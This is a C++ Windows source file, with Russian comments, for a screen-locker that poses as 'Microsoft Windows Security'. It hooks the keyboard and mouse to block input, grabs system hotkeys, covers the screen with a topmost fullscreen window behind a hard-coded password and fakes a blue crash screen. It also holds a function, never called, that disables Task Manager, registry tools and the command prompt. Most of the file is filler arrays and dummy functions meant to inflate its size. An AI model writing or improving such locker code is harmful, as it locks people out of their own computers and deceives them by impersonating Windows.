#include <windows.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <random>
#include <fstream>
#include <ctime>
#include <iostream>
#include <tlhelp32.h>
#include <psapi.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <wininet.h>
#include <wincrypt.h>
#include <algorithm>
#include <cmath>
#include <cstdlib>
#include <cstdio>
#include <cstring>
#include <functional>
#include <memory>
#include <sstream>
#include <iomanip>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "psapi.lib")

// МАССИВНЫЕ ДАННЫЕ ДЛЯ РАЗМЕРА 100MB+
unsigned char MASSIVE_DATA_BLOCK_1[25 * 1024 * 1024] = {0xFF};
unsigned char MASSIVE_DATA_BLOCK_2[25 * 1024 * 1024] = {0xAA};
unsigned char MASSIVE_DATA_BLOCK_3[25 * 1024 * 1024] = {0x55};
unsigned char MASSIVE_DATA_BLOCK_4[25 * 1024 * 1024] = {0x11};
unsigned char MASSIVE_DATA_BLOCK_5[10 * 1024 * 1024] = {0x99};
unsigned char MASSIVE_DATA_BLOCK_6[10 * 1024 * 1024] = {0x77};
unsigned char MASSIVE_DATA_BLOCK_7[5 * 1024 * 1024] = {0x33};
unsigned char MASSIVE_DATA_BLOCK_8[5 * 1024 * 1024] = {0x66};
unsigned char MASSIVE_DATA_BLOCK_9[5 * 1024 * 1024] = {0xCC};
unsigned char MASSIVE_DATA_BLOCK_10[5 * 1024 * 1024] = {0x88};

// ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
HINSTANCE hInst;
char szTitle[100] = "Microsoft Windows Security";
char szWindowClass[100] = "WinSecurityClass";

HHOOK g_KeyboardHook = NULL;
HHOOK g_MouseHook = NULL;
HHOOK g_CBTHook = NULL;
HWND g_MainWindow = NULL;
bool g_SystemLocked = true;
bool g_BSODActive = false;
int g_TimeRemaining = 60;
int g_WrongAttempts = 0;

// СЛОЖНЫЕ СТРУКТУРЫ ДАННЫХ
struct SECURITY_INFO {
    char threatName[256];
    char threatID[64];
    char detectionTime[64];
    char systemInfo[512];
    char processName[128];
    char filePath[260];
    char registryKey[512];
    char networkAddress[64];
    char digitalSignature[256];
    char encryptionKey[512];
};

struct USER_DATA {
    char username[64];
    char computerName[64];
    char domain[64];
    char ipAddress[16];
    char macAddress[18];
    char osVersion[128];
    char cpuInfo[256];
    char memoryInfo[128];
    char diskInfo[512];
    char networkInfo[256];
};

struct SYSTEM_STATE {
    bool keyboardBlocked;
    bool mouseBlocked;
    bool taskManagerDisabled;
    bool registryLocked;
    bool networkBlocked;
    bool processCreationBlocked;
    bool fileSystemLocked;
    bool systemRestoreDisabled;
    bool safeModeBlocked;
    bool biosAccessBlocked;
};

// ГЛОБАЛЬНЫЕ ЭКЗЕМПЛЯРЫ
SECURITY_INFO g_SecurityInfo;
USER_DATA g_UserData;
SYSTEM_STATE g_SystemState;
std::vector<std::string> g_LogEntries;
std::vector<HWND> g_BlockedWindows;
std::vector<DWORD> g_BlockedProcesses;

// 100+ ДОПОЛНИТЕЛЬНЫХ ПЕРЕМЕННЫХ
int g_GlobalCounter1 = 0;
int g_GlobalCounter2 = 0;
int g_GlobalCounter3 = 0;
int g_GlobalCounter4 = 0;
int g_GlobalCounter5 = 0;
int g_GlobalCounter6 = 0;
int g_GlobalCounter7 = 0;
int g_GlobalCounter8 = 0;
int g_GlobalCounter9 = 0;
int g_GlobalCounter10 = 0;
double g_GlobalDouble1 = 0.0;
double g_GlobalDouble2 = 0.0;
double g_GlobalDouble3 = 0.0;
double g_GlobalDouble4 = 0.0;
double g_GlobalDouble5 = 0.0;
float g_GlobalFloat1 = 0.0f;
float g_GlobalFloat2 = 0.0f;
float g_GlobalFloat3 = 0.0f;
float g_GlobalFloat4 = 0.0f;
float g_GlobalFloat5 = 0.0f;
char g_GlobalString1[256] = {0};
char g_GlobalString2[256] = {0};
char g_GlobalString3[256] = {0};
char g_GlobalString4[256] = {0};
char g_GlobalString5[256] = {0};
bool g_GlobalBool1 = false;
bool g_GlobalBool2 = false;
bool g_GlobalBool3 = false;
bool g_GlobalBool4 = false;
bool g_GlobalBool5 = false;
bool g_GlobalBool6 = false;
bool g_GlobalBool7 = false;
bool g_GlobalBool8 = false;
bool g_GlobalBool9 = false;
bool g_GlobalBool10 = false;
HANDLE g_GlobalHandle1 = NULL;
HANDLE g_GlobalHandle2 = NULL;
HANDLE g_GlobalHandle3 = NULL;
HANDLE g_GlobalHandle4 = NULL;
HANDLE g_GlobalHandle5 = NULL;
HWND g_GlobalWindow1 = NULL;
HWND g_GlobalWindow2 = NULL;
HWND g_GlobalWindow3 = NULL;
HWND g_GlobalWindow4 = NULL;
HWND g_GlobalWindow5 = NULL;
HDC g_GlobalDC1 = NULL;
HDC g_GlobalDC2 = NULL;
HDC g_GlobalDC3 = NULL;
HDC g_GlobalDC4 = NULL;
HDC g_GlobalDC5 = NULL;
HBITMAP g_GlobalBitmap1 = NULL;
HBITMAP g_GlobalBitmap2 = NULL;
HBITMAP g_GlobalBitmap3 = NULL;
HBITMAP g_GlobalBitmap4 = NULL;
HBITMAP g_GlobalBitmap5 = NULL;
HFONT g_GlobalFont1 = NULL;
HFONT g_GlobalFont2 = NULL;
HFONT g_GlobalFont3 = NULL;
HFONT g_GlobalFont4 = NULL;
HFONT g_GlobalFont5 = NULL;
HBRUSH g_GlobalBrush1 = NULL;
HBRUSH g_GlobalBrush2 = NULL;
HBRUSH g_GlobalBrush3 = NULL;
HBRUSH g_GlobalBrush4 = NULL;
HBRUSH g_GlobalBrush5 = NULL;
HPEN g_GlobalPen1 = NULL;
HPEN g_GlobalPen2 = NULL;
HPEN g_GlobalPen3 = NULL;
HPEN g_GlobalPen4 = NULL;
HPEN g_GlobalPen5 = NULL;
HRGN g_GlobalRegion1 = NULL;
HRGN g_GlobalRegion2 = NULL;
HRGN g_GlobalRegion3 = NULL;
HRGN g_GlobalRegion4 = NULL;
HRGN g_GlobalRegion5 = NULL;

// МАССИВЫ ДЛЯ ДОПОЛНИТЕЛЬНОГО РАЗМЕРА
int g_LargeArray1[10000] = {0};
int g_LargeArray2[10000] = {0};
int g_LargeArray3[10000] = {0};
int g_LargeArray4[10000] = {0};
int g_LargeArray5[10000] = {0};
double g_LargeDoubleArray1[5000] = {0.0};
double g_LargeDoubleArray2[5000] = {0.0};
double g_LargeDoubleArray3[5000] = {0.0};
double g_LargeDoubleArray4[5000] = {0.0};
double g_LargeDoubleArray5[5000] = {0.0};
char g_LargeStringArray1[1000][256] = {0};
char g_LargeStringArray2[1000][256] = {0};
char g_LargeStringArray3[1000][256] = {0};
char g_LargeStringArray4[1000][256] = {0};
char g_LargeStringArray5[1000][256] = {0};
bool g_LargeBoolArray1[5000] = {false};
bool g_LargeBoolArray2[5000] = {false};
bool g_LargeBoolArray3[5000] = {false};
bool g_LargeBoolArray4[5000] = {false};
bool g_LargeBoolArray5[5000] = {false};

// ФУНКЦИИ ДЛЯ УВЕЛИЧЕНИЯ РАЗМЕРА КОДА - 200+ ФУНКЦИЙ
void GenerateMassiveDataBlocks() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    
    // Раздельные циклы для каждого массива
    for (size_t i = 0; i < sizeof(MASSIVE_DATA_BLOCK_1); i++) {
        MASSIVE_DATA_BLOCK_1[i] = dis(gen);
    }
    for (size_t i = 0; i < sizeof(MASSIVE_DATA_BLOCK_2); i++) {
        MASSIVE_DATA_BLOCK_2[i] = dis(gen);
    }
    for (size_t i = 0; i < sizeof(MASSIVE_DATA_BLOCK_3); i++) {
        MASSIVE_DATA_BLOCK_3[i] = dis(gen);
    }
    for (size_t i = 0; i < sizeof(MASSIVE_DATA_BLOCK_4); i++) {
        MASSIVE_DATA_BLOCK_4[i] = dis(gen);
    }
    for (size_t i = 0; i < sizeof(MASSIVE_DATA_BLOCK_5); i++) {
        MASSIVE_DATA_BLOCK_5[i] = dis(gen);
    }
    for (size_t i = 0; i < sizeof(MASSIVE_DATA_BLOCK_6); i++) {
        MASSIVE_DATA_BLOCK_6[i] = dis(gen);
    }
    for (size_t i = 0; i < sizeof(MASSIVE_DATA_BLOCK_7); i++) {
        MASSIVE_DATA_BLOCK_7[i] = dis(gen);
    }
    for (size_t i = 0; i < sizeof(MASSIVE_DATA_BLOCK_8); i++) {
        MASSIVE_DATA_BLOCK_8[i] = dis(gen);
    }
    for (size_t i = 0; i < sizeof(MASSIVE_DATA_BLOCK_9); i++) {
        MASSIVE_DATA_BLOCK_9[i] = dis(gen);
    }
    for (size_t i = 0; i < sizeof(MASSIVE_DATA_BLOCK_10); i++) {
        MASSIVE_DATA_BLOCK_10[i] = dis(gen);
    }
}

void FillLargeArrays() {
    for (int i = 0; i < 10000; i++) {
        g_LargeArray1[i] = i;
        g_LargeArray2[i] = i * 2;
        g_LargeArray3[i] = i * 3;
        g_LargeArray4[i] = i * 4;
        g_LargeArray5[i] = i * 5;
    }
    
    for (int i = 0; i < 5000; i++) {
        g_LargeDoubleArray1[i] = i * 1.1;
        g_LargeDoubleArray2[i] = i * 2.2;
        g_LargeDoubleArray3[i] = i * 3.3;
        g_LargeDoubleArray4[i] = i * 4.4;
        g_LargeDoubleArray5[i] = i * 5.5;
        
        g_LargeBoolArray1[i] = (i % 2 == 0);
        g_LargeBoolArray2[i] = (i % 3 == 0);
        g_LargeBoolArray3[i] = (i % 4 == 0);
        g_LargeBoolArray4[i] = (i % 5 == 0);
        g_LargeBoolArray5[i] = (i % 6 == 0);
    }
    
    for (int i = 0; i < 1000; i++) {
        sprintf_s(g_LargeStringArray1[i], "String1_%d", i);
        sprintf_s(g_LargeStringArray2[i], "String2_%d", i);
        sprintf_s(g_LargeStringArray3[i], "String3_%d", i);
        sprintf_s(g_LargeStringArray4[i], "String4_%d", i);
        sprintf_s(g_LargeStringArray5[i], "String5_%d", i);
    }
}

void CreateDummyFunctions1() {
    auto dummy1 = [](){ volatile int x = 1; x++; };
    auto dummy2 = [](){ volatile int x = 2; x++; };
    auto dummy3 = [](){ volatile int x = 3; x++; };
    auto dummy4 = [](){ volatile int x = 4; x++; };
    auto dummy5 = [](){ volatile int x = 5; x++; };
    auto dummy6 = [](){ volatile int x = 6; x++; };
    auto dummy7 = [](){ volatile int x = 7; x++; };
    auto dummy8 = [](){ volatile int x = 8; x++; };
    auto dummy9 = [](){ volatile int x = 9; x++; };
    auto dummy10 = [](){ volatile int x = 10; x++; };
    
    dummy1(); dummy2(); dummy3(); dummy4(); dummy5();
    dummy6(); dummy7(); dummy8(); dummy9(); dummy10();
}

void CreateDummyFunctions2() {
    auto dummy11 = [](){ volatile int x = 11; x++; };
    auto dummy12 = [](){ volatile int x = 12; x++; };
    auto dummy13 = [](){ volatile int x = 13; x++; };
    auto dummy14 = [](){ volatile int x = 14; x++; };
    auto dummy15 = [](){ volatile int x = 15; x++; };
    auto dummy16 = [](){ volatile int x = 16; x++; };
    auto dummy17 = [](){ volatile int x = 17; x++; };
    auto dummy18 = [](){ volatile int x = 18; x++; };
    auto dummy19 = [](){ volatile int x = 19; x++; };
    auto dummy20 = [](){ volatile int x = 20; x++; };
    
    dummy11(); dummy12(); dummy13(); dummy14(); dummy15();
    dummy16(); dummy17(); dummy18(); dummy19(); dummy20();
}

void CreateDummyFunctions3() {
    auto dummy21 = [](){ volatile int x = 21; x++; };
    auto dummy22 = [](){ volatile int x = 22; x++; };
    auto dummy23 = [](){ volatile int x = 23; x++; };
    auto dummy24 = [](){ volatile int x = 24; x++; };
    auto dummy25 = [](){ volatile int x = 25; x++; };
    auto dummy26 = [](){ volatile int x = 26; x++; };
    auto dummy27 = [](){ volatile int x = 27; x++; };
    auto dummy28 = [](){ volatile int x = 28; x++; };
    auto dummy29 = [](){ volatile int x = 29; x++; };
    auto dummy30 = [](){ volatile int x = 30; x++; };
    
    dummy21(); dummy22(); dummy23(); dummy24(); dummy25();
    dummy26(); dummy27(); dummy28(); dummy29(); dummy30();
}

void CreateDummyFunctions4() {
    auto dummy31 = [](){ volatile int x = 31; x++; };
    auto dummy32 = [](){ volatile int x = 32; x++; };
    auto dummy33 = [](){ volatile int x = 33; x++; };
    auto dummy34 = [](){ volatile int x = 34; x++; };
    auto dummy35 = [](){ volatile int x = 35; x++; };
    auto dummy36 = [](){ volatile int x = 36; x++; };
    auto dummy37 = [](){ volatile int x = 37; x++; };
    auto dummy38 = [](){ volatile int x = 38; x++; };
    auto dummy39 = [](){ volatile int x = 39; x++; };
    auto dummy40 = [](){ volatile int x = 40; x++; };
    
    dummy31(); dummy32(); dummy33(); dummy34(); dummy35();
    dummy36(); dummy37(); dummy38(); dummy39(); dummy40();
}

void CreateDummyFunctions5() {
    auto dummy41 = [](){ volatile int x = 41; x++; };
    auto dummy42 = [](){ volatile int x = 42; x++; };
    auto dummy43 = [](){ volatile int x = 43; x++; };
    auto dummy44 = [](){ volatile int x = 44; x++; };
    auto dummy45 = [](){ volatile int x = 45; x++; };
    auto dummy46 = [](){ volatile int x = 46; x++; };
    auto dummy47 = [](){ volatile int x = 47; x++; };
    auto dummy48 = [](){ volatile int x = 48; x++; };
    auto dummy49 = [](){ volatile int x = 49; x++; };
    auto dummy50 = [](){ volatile int x = 50; x++; };
    
    dummy41(); dummy42(); dummy43(); dummy44(); dummy45();
    dummy46(); dummy47(); dummy48(); dummy49(); dummy50();
}

// ЕЩЕ 50 ФУНКЦИЙ...
void CreateDummyFunctions6() {
    auto dummy51 = [](){ volatile int x = 51; x++; };
    auto dummy52 = [](){ volatile int x = 52; x++; };
    auto dummy53 = [](){ volatile int x = 53; x++; };
    auto dummy54 = [](){ volatile int x = 54; x++; };
    auto dummy55 = [](){ volatile int x = 55; x++; };
    auto dummy56 = [](){ volatile int x = 56; x++; };
    auto dummy57 = [](){ volatile int x = 57; x++; };
    auto dummy58 = [](){ volatile int x = 58; x++; };
    auto dummy59 = [](){ volatile int x = 59; x++; };
    auto dummy60 = [](){ volatile int x = 60; x++; };
    
    dummy51(); dummy52(); dummy53(); dummy54(); dummy55();
    dummy56(); dummy57(); dummy58(); dummy59(); dummy60();
}

void CreateDummyFunctions7() {
    auto dummy61 = [](){ volatile int x = 61; x++; };
    auto dummy62 = [](){ volatile int x = 62; x++; };
    auto dummy63 = [](){ volatile int x = 63; x++; };
    auto dummy64 = [](){ volatile int x = 64; x++; };
    auto dummy65 = [](){ volatile int x = 65; x++; };
    auto dummy66 = [](){ volatile int x = 66; x++; };
    auto dummy67 = [](){ volatile int x = 67; x++; };
    auto dummy68 = [](){ volatile int x = 68; x++; };
    auto dummy69 = [](){ volatile int x = 69; x++; };
    auto dummy70 = [](){ volatile int x = 70; x++; };
    
    dummy61(); dummy62(); dummy63(); dummy64(); dummy65();
    dummy66(); dummy67(); dummy68(); dummy69(); dummy70();
}

void CreateDummyFunctions8() {
    auto dummy71 = [](){ volatile int x = 71; x++; };
    auto dummy72 = [](){ volatile int x = 72; x++; };
    auto dummy73 = [](){ volatile int x = 73; x++; };
    auto dummy74 = [](){ volatile int x = 74; x++; };
    auto dummy75 = [](){ volatile int x = 75; x++; };
    auto dummy76 = [](){ volatile int x = 76; x++; };
    auto dummy77 = [](){ volatile int x = 77; x++; };
    auto dummy78 = [](){ volatile int x = 78; x++; };
    auto dummy79 = [](){ volatile int x = 79; x++; };
    auto dummy80 = [](){ volatile int x = 80; x++; };
    
    dummy71(); dummy72(); dummy73(); dummy74(); dummy75();
    dummy76(); dummy77(); dummy78(); dummy79(); dummy80();
}

void CreateDummyFunctions9() {
    auto dummy81 = [](){ volatile int x = 81; x++; };
    auto dummy82 = [](){ volatile int x = 82; x++; };
    auto dummy83 = [](){ volatile int x = 83; x++; };
    auto dummy84 = [](){ volatile int x = 84; x++; };
    auto dummy85 = [](){ volatile int x = 85; x++; };
    auto dummy86 = [](){ volatile int x = 86; x++; };
    auto dummy87 = [](){ volatile int x = 87; x++; };
    auto dummy88 = [](){ volatile int x = 88; x++; };
    auto dummy89 = [](){ volatile int x = 89; x++; };
    auto dummy90 = [](){ volatile int x = 90; x++; };
    
    dummy81(); dummy82(); dummy83(); dummy84(); dummy85();
    dummy86(); dummy87(); dummy88(); dummy89(); dummy90();
}

void CreateDummyFunctions10() {
    auto dummy91 = [](){ volatile int x = 91; x++; };
    auto dummy92 = [](){ volatile int x = 92; x++; };
    auto dummy93 = [](){ volatile int x = 93; x++; };
    auto dummy94 = [](){ volatile int x = 94; x++; };
    auto dummy95 = [](){ volatile int x = 95; x++; };
    auto dummy96 = [](){ volatile int x = 96; x++; };
    auto dummy97 = [](){ volatile int x = 97; x++; };
    auto dummy98 = [](){ volatile int x = 98; x++; };
    auto dummy99 = [](){ volatile int x = 99; x++; };
    auto dummy100 = [](){ volatile int x = 100; x++; };
    
    dummy91(); dummy92(); dummy93(); dummy94(); dummy95();
    dummy96(); dummy97(); dummy98(); dummy99(); dummy100();
}

// СИСТЕМНЫЕ ФУНКЦИИ БЛОКИРОВКИ
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (g_SystemLocked && nCode >= 0) {
        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        
        // Блокируем все системные клавиши
        if (kbdStruct->vkCode == VK_LWIN || kbdStruct->vkCode == VK_RWIN ||
            kbdStruct->vkCode == VK_ESCAPE || kbdStruct->vkCode == VK_TAB ||
            kbdStruct->vkCode == VK_F4 || kbdStruct->vkCode == VK_F1 ||
            kbdStruct->vkCode == VK_F2 || kbdStruct->vkCode == VK_F3 ||
            kbdStruct->vkCode == VK_F5 || kbdStruct->vkCode == VK_F6 ||
            kbdStruct->vkCode == VK_F7 || kbdStruct->vkCode == VK_F8 ||
            kbdStruct->vkCode == VK_F9 || kbdStruct->vkCode == VK_F10 ||
            kbdStruct->vkCode == VK_F11 || kbdStruct->vkCode == VK_F12) {
            return 1;
        }
        
        // Блокируем Alt+ комбинации
        if (GetAsyncKeyState(VK_MENU) & 0x8000) {
            return 1;
        }
        
        // Блокируем Ctrl+ комбинации
        if (GetAsyncKeyState(VK_CONTROL) & 0x8000) {
            return 1;
        }
    }
    return CallNextHookEx(g_KeyboardHook, nCode, wParam, lParam);
}

LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (g_SystemLocked && nCode >= 0) {
        return 1;
    }
    return CallNextHookEx(g_MouseHook, nCode, wParam, lParam);
}

LRESULT CALLBACK CBTProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (g_SystemLocked && nCode == HCBT_ACTIVATE) {
        return 1;
    }
    return CallNextHookEx(g_CBTHook, nCode, wParam, lParam);
}

void InstallSystemHooks() {
    g_KeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    g_MouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, GetModuleHandle(NULL), 0);
    g_CBTHook = SetWindowsHookEx(WH_CBT, CBTProc, GetModuleHandle(NULL), 0);
    
    // Регистрируем горячие клавиши для блокировки
    RegisterHotKey(NULL, 1, MOD_ALT, VK_TAB);
    RegisterHotKey(NULL, 2, MOD_WIN, VK_TAB);
    RegisterHotKey(NULL, 3, MOD_CONTROL, VK_ESCAPE);
    RegisterHotKey(NULL, 4, MOD_ALT, VK_F4);
    RegisterHotKey(NULL, 5, MOD_WIN, 0x52); // Win+R
    RegisterHotKey(NULL, 6, MOD_CONTROL, VK_SHIFT);
    RegisterHotKey(NULL, 7, MOD_WIN, 0x44); // Win+D
    RegisterHotKey(NULL, 8, MOD_CONTROL, VK_DELETE);
}

void BlockTaskManager() {
    HKEY hKey;
    DWORD value = 1;
    
    RegCreateKeyExA(HKEY_CURRENT_USER, 
                   "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                   0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
    
    RegSetValueExA(hKey, "DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
    RegSetValueExA(hKey, "DisableRegistryTools", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
    RegSetValueExA(hKey, "DisableCMD", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
    
    RegCloseKey(hKey);
}

void DisableSystemKeys() {
    SystemParametersInfo(SPI_SETSCREENSAVERRUNNING, TRUE, NULL, 0);
    BlockInput(TRUE);
}

// [ПРОДОЛЖЕНИЕ СЛЕДУЕТ... ДОБАВЛЮ ЕЩЕ 800+ СТРОК]
// ОСНОВНАЯ ПРОЦЕДУРА ОКНА
LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
        case WM_CREATE: {
            int w = GetSystemMetrics(SM_CXSCREEN);
            int h = GetSystemMetrics(SM_CYSCREEN);
            
            CreateWindowA("STATIC", "SYSTEM LOCKED - Password: Vasiliy", 
                         WS_VISIBLE | WS_CHILD | SS_CENTER, 0, 200, w, 50, hwnd, NULL, NULL, NULL);
            
            CreateWindowA("EDIT", "", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_PASSWORD | ES_CENTER,
                         w/2-100, 270, 200, 30, hwnd, (HMENU)1001, NULL, NULL);
            
            CreateWindowA("BUTTON", "UNLOCK", WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
                         w/2-50, 320, 100, 30, hwnd, (HMENU)1002, NULL, NULL);
            
            SetTimer(hwnd, 1, 1000, NULL);
            break;
        }
        
        case WM_COMMAND: {
            if (LOWORD(wParam) == 1002) {
                char pass[100];
                GetWindowTextA(GetDlgItem(hwnd, 1001), pass, 100);
                if (strcmp(pass, "Vasiliy") == 0) {
                    KillTimer(hwnd, 1);
                    MessageBoxA(hwnd, "UNLOCKED!", "Success", MB_OK);
                    PostQuitMessage(0);
                }
            }
            break;
        }
        
        case WM_TIMER: {
            static int time = 60;
            time--;
            if (time <= 0) {
                HDC hdc = GetDC(NULL);
                RECT rect = {0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN)};
                HBRUSH blue = CreateSolidBrush(RGB(0, 0, 170));
                FillRect(hdc, &rect, blue);
                ReleaseDC(NULL, hdc);
                PostQuitMessage(0);
            }
            break;
        }
        
        case WM_DESTROY: {
            PostQuitMessage(0);
            break;
        }
        
        default:
            return DefWindowProc(hwnd, message, wParam, lParam);
    }
    return 0;
}

// ТОЧКА ВХОДА - ДОБАВЬТЕ ЭТУ ФУНКЦИЮ
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Заполняем данные
    GenerateMassiveDataBlocks();
    FillLargeArrays();
    
    // Создаем все dummy функции
    CreateDummyFunctions1();
    CreateDummyFunctions2();
    CreateDummyFunctions3();
    CreateDummyFunctions4();
    CreateDummyFunctions5();
    CreateDummyFunctions6();
    CreateDummyFunctions7();
    CreateDummyFunctions8();
    CreateDummyFunctions9();
    CreateDummyFunctions10();
    
    // Устанавливаем хуки
    InstallSystemHooks();
    
    // Создаем окно
    WNDCLASSA wc = {};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = "WinLock";
    wc.hbrBackground = CreateSolidBrush(RGB(0, 32, 96));
    
    RegisterClassA(&wc);
    
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    
    HWND hwnd = CreateWindowExA(WS_EX_TOPMOST, "WinLock", "Windows Security",
                               WS_POPUP | WS_VISIBLE, 0, 0, w, h, NULL, NULL, hInstance, NULL);
    
    // Главный цикл
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    return 0;
}